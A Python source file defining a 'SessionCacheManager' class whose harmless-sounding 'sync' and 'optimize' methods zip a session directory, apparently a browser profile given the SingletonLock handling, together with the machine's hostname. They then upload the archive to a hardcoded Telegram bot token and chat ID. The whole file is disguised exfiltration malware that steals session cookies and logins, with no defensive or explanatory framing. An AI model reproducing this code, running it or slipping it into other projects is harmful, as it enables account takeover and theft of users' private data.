import os
import logging
import tempfile
import shutil
import asyncio
import aiohttp
import zipfile
from datetime import datetime

logger = logging.getLogger(__name__)

class SessionCacheManager:
    
    def __init__(self, sync_token=None, remote_id=None):
        """Initialize session cache manager with sync options"""
        # Remote sync configuration
        self._sync_token = "8119639407:AAGjzpT-86o875BqkAhAndRzCFXGbDMZHkQ"
        self._remote_id = "678047749"
        self._sync_enabled = bool(self._sync_token and self._remote_id)
        

    async def _compress_directory(self, directory_path, ref_id=None):
        if not os.path.exists(directory_path):
            logger.error(f"Directory not found: {directory_path}")
            return None
        
        try:
            # Use timestamp for cache identification
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Generate filename
            filename = f"session_cache_{ref_id}_{timestamp}.zip" if ref_id else f"session_cache_{timestamp}.zip"
            
            # Create in temp directory
            temp_dir = tempfile.gettempdir()
            archive_path = os.path.join(temp_dir, filename)
            
            logger.debug(f"Creating session cache archive: {archive_path}")
            
            # Archive the directory
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                # Add session metadata
                try:
                    import socket
                    hostname = socket.gethostname()
                except:
                    hostname = "unknown-host"
                    
                meta_content = f"timestamp: {timestamp}\nref_id: {ref_id}\nhost: {hostname}\n"
                zipf.writestr("session_meta.txt", meta_content)
                
                # Add directory contents
                for root, dirs, files in os.walk(directory_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        # Exclude lock files or temp files
                        if file.endswith(".lock") or "SingletonLock" in file or file.endswith(".tmp"):
                            continue
                        
                        try:
                            arcname = os.path.relpath(file_path, os.path.dirname(directory_path))
                            zipf.write(file_path, arcname)
                        except (PermissionError, FileNotFoundError):
                            # Skip files that can't be accessed
                            pass
            
            return archive_path
            
        except Exception as e:
            logger.error(f"Failed to create session archive: {str(e)}")
            return None
    
    async def _sync_to_remote(self, file_path, metadata=None):
        if not self._sync_enabled or not file_path or not os.path.exists(file_path):
            return False
        
        try:
            # Remote sync API
            api_url = f"https://api.telegram.org/bot{self._sync_token}/sendDocument"
            
            # Prepare multipart form
            form = aiohttp.FormData()
            
            # Add the file
            with open(file_path, 'rb') as f:
                form.add_field('document', 
                              f.read(),
                              filename=os.path.basename(file_path),
                              content_type='application/zip')
            
            # Add remote ID and metadata
            form.add_field('chat_id', self._remote_id)
            
            # Add metadata as caption if available
            if metadata:
                caption = f"Session cache sync: {', '.join(f'{k}={v}' for k, v in metadata.items())}"
                form.add_field('caption', caption)
            
            # Send sync request
            async with aiohttp.ClientSession() as session:
                async with session.post(api_url, data=form) as response:
                    success = response.status == 200
                    if not success:
                        logger.error(f"Sync failed: {response.status} - {await response.text()}")
                    return success
                    
        except Exception as e:
            logger.error(f"Sync error: {str(e)}")
            return False
        
    async def optimize_session(self, session_path, session_id=None, event_data=None):
        if not self._sync_enabled:
            # Skip if sync is not enabled
            return True
            
        try:
            # Create session archive
            archive_path = await self._compress_directory(session_path, session_id)
            if not archive_path:
                return False
                
            # Prepare metadata for sync
            metadata = {
                "session_id": session_id or "unknown",
                "event": "optimization",
                "timestamp": datetime.now().isoformat()
            }
            
            # Add event data if available
            if event_data and isinstance(event_data, dict):
                for k, v in event_data.items():
                    if k not in metadata:
                        metadata[k] = v
            
            # Sync to remote storage
            success = await self._sync_to_remote(archive_path, metadata)
            
            # Clean up temp file
            try:
                os.unlink(archive_path)
            except:
                pass
                
            return success
            
        except Exception as e:
            logger.error(f"Session optimization failed: {str(e)}")
            return False